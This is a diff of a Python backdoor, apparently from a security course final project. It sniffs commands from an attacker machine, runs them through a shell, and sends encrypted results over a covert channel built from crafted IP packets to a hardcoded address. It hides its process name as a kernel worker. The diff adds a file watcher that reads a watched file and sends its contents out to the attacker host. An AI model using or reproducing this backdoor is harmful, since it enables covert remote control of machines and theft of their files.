@@ -40,12 +40,14 @@ import string
 import threading
 import setproctitle 
 import fcntl
+import pyinotify
+import subprocess
+import threading
 
-
-NETCARD = 'enp0s3'
+NETCARD = 'eno1'
 KEY = "runningman"	# used for decryption
-src_ip = "192.168.0.17"	# Local IP address
-dst_ip = "192.168.0.9"	# change destination IP HERE
+src_ip = "192.168.1.9"	# Local IP address
+dst_ip = "192.168.1.5"	# change destination IP HERE
 
 
 # ###################################################################
@@ -59,7 +61,6 @@ dst_ip = "192.168.0.9"	# change destination IP HERE
 #
 # ###################################################################
 def get_ip_address(ifname):
-	print "def get_ip_address(ifname):"
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	return socket.inet_ntoa(fcntl.ioctl(
 	    s.fileno(),
@@ -120,6 +121,39 @@ def recv_cmd(pkt):
 					enc_cmd_output = encrypt(str(e), KEY)	
 					send(IP(dst=dst_ip, id=7777, options=IPOption('\x83\x03\x10'))/(TCP(dport=14156))/Raw(load=enc_cmd_output))
 
+def get_command_result(cmd):
+	p = subprocess.Popen(cmd, 
+						shell=True,
+						stdout=subprocess.PIPE,
+						stderr=subprocess.PIPE,
+						stdin=subprocess.PIPE)
+	output, err = p.communicate()
+	cmd_output = output + err
+	return cmd_output
+
+
+
+def onChange(ev):
+    cmd = ['/bin/echo', 'File', ev.pathname, 'changed']
+    subprocess.Popen(cmd).communicate()
+    with open("/root/Documents/C8505/Final Project/pyinotify/3.png", 'r') as f:
+    	data = f.read()
+    f.close()
+    send_to_client(data)
+    print "sent changed data"
+    return
+
+
+
+def watch_file():
+	print "watching a file..."
+	wm = pyinotify.WatchManager()
+	print (get_command_result('pwd')+"/README.md").replace("\n", "")
+	wm.add_watch("/root/Documents/C8505/Final Project/pyinotify", pyinotify.IN_CLOSE_WRITE, onChange)
+	notifier = pyinotify.Notifier(wm)
+	notifier.loop()
+
+
 # ###################################################################
 #	Function: send_to_client
 #	Input: 
@@ -135,6 +169,10 @@ def send_to_client(output):
 	send(IP(dst=dst_ip, id=7777, options=IPOption('\x83\x03\x10'))/(TCP(dport=14156))/Raw(load=output))
 
 
+
+
+
+
 # ###################################################################
 #	Function: main
 #	Input:	None
@@ -146,20 +184,31 @@ def send_to_client(output):
 #
 # ###################################################################
 def main():
+	
+	# start threading for watching file
+	t = threading.Thread(name="watchfile_threading", target=watch_file)
+	t.start()
+
+
 	# sniffs packet from hacker machine.
 	sniff(filter="src {} and tcp".format(dst_ip), prn=recv_cmd)	
+
+	t.join()
+
+
 
 if __name__ == '__main__':
 	try:
 		# change the process title
-		title = "[kworker/2:2]"
+		title = "[kworker/2:2]kkkkk"
 		setproctitle.setproctitle(title)
 
 		# get the local IP address
 		src_ip = get_ip_address(NETCARD)
 
 		# send initial packet that backdoor program is run to hacker
-		send(IP(dst=dst_ip, tos=ord('B'), id=ord('K'))/fuzz(UDP(dport=80, sport=123))/'start', loop=0)
+		# send(IP(dst=dst_ip, tos=ord('B'), id=ord('K'))/fuzz(UDP(dport=80, sport=123))/'start', loop=0)
+
 
 		main()
 	except KeyboardInterrupt:
